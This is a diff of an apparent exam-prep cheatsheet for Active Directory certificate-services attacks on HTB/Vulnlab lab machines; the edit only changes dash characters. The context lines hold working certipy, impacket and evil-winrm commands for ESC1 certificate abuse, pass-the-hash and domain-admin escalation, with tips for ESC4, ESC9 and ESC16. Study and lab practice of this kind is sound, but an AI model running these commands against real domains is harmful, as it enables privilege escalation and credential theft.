@@ -1155,7 +1155,7 @@ export KRB5CCNAME=Administrator.ccache
 impacket-mssqlclient -k nagoya.nagoya-industries.com
 ```
 
-## 23.15 Vulnlab Hybrid — ESC1 with extracted machine acct | CA: `hybrid-DC01-CA` | Template: `HYBRIDCOMPUTERS`
+## 23.15 Vulnlab Hybrid - ESC1 with extracted machine acct | CA: `hybrid-DC01-CA` | Template: `HYBRIDCOMPUTERS`
 ```bash
 keytabextract krb5.keytab     # → MAIL01$ NT 0f916c5246fdbc7ba95dcef4126d57bd
 certipy req -u 'MAIL01$' -hashes :0f916c5246fdbc7ba95dcef4126d57bd \
@@ -1164,7 +1164,7 @@ certipy req -u 'MAIL01$' -hashes :0f916c5246fdbc7ba95dcef4126d57bd \
 certipy auth -pfx administrator.pfx -username administrator -domain hybrid.vl -dc-ip 10.10.x.x
 ```
 
-## 23.16 HTB/Vulnlab Retro — ESC1 pre-Win2K computer | CA: `retro-DC-CA` | Template: `RetroClients`
+## 23.16 HTB/Vulnlab Retro - ESC1 pre-Win2K computer | CA: `retro-DC-CA` | Template: `RetroClients`
 ```bash
 # Pre-Win2K machine acct: BANKING / banking (lowercase samaccountname, no $)
 impacket-getTGT 'retro.vl/BANKING$:banking' -dc-ip 10.10.x.x
@@ -1177,7 +1177,7 @@ certipy auth -pfx administrator.pfx -username Administrator -domain retro.vl -dc
 
 ---
 
-# PART 24 — MASTER ONE-LINER CHEATSHEET
+# PART 24 - MASTER ONE-LINER CHEATSHEET
 
 ```bash
 # ENUMERATION
@@ -1265,15 +1265,15 @@ evil-winrm -i DC -u admin -H NTHASH
 
 ---
 
-# PART 25 — CRITICAL EXAM REMINDERS
+# PART 25 - CRITICAL EXAM REMINDERS
 
-1. **Always sync time first** — `sudo ntpdate -u <DC>` before any certipy auth. Many "trust" errors are actually clock skew misreported.
-2. **ESC4 cleanup** — `template -save-configuration` BEFORE modifying; `-write-configuration` AFTER exploit.
-3. **ESC9/16 UPN restore** — revert VICTIM's UPN BEFORE auth; collisions break Kerberos.
-4. **`-domain` flag on `certipy auth`** — REQUIRED when cert SAN UPN has no `@domain` (ESC9/16 spoof).
-5. **`-sid` flag on `certipy req`** — REQUIRED in patched environments (post-KB5014754 Full Enforcement).
-6. **PKINIT fail → `-ldap-shell`** — when KDC has no PKINIT cert, switch to Schannel.
-7. **PEM→PFX for Rubeus** — must use `-keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0"`.
+1. **Always sync time first** - `sudo ntpdate -u <DC>` before any certipy auth. Many "trust" errors are actually clock skew misreported.
+2. **ESC4 cleanup** - `template -save-configuration` BEFORE modifying; `-write-configuration` AFTER exploit.
+3. **ESC9/16 UPN restore** - revert VICTIM's UPN BEFORE auth; collisions break Kerberos.
+4. **`-domain` flag on `certipy auth`** - REQUIRED when cert SAN UPN has no `@domain` (ESC9/16 spoof).
+5. **`-sid` flag on `certipy req`** - REQUIRED in patched environments (post-KB5014754 Full Enforcement).
+6. **PKINIT fail → `-ldap-shell`** - when KDC has no PKINIT cert, switch to Schannel.
+7. **PEM→PFX for Rubeus** - must use `-keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0"`.
 8. **`certipy ≥ 5.0.0`** required for ESC15/ESC16 detection (Fluffy, TombWatcher).
 9. **Schema v1 templates** (WebServer, User, etc.) are ESC15-vulnerable until Nov 2024 patch.
 10. **Pre-Win2K computers** have password = lowercase samaccountname (no `$`). MAQ default = 10 enables impacket-addcomputer.
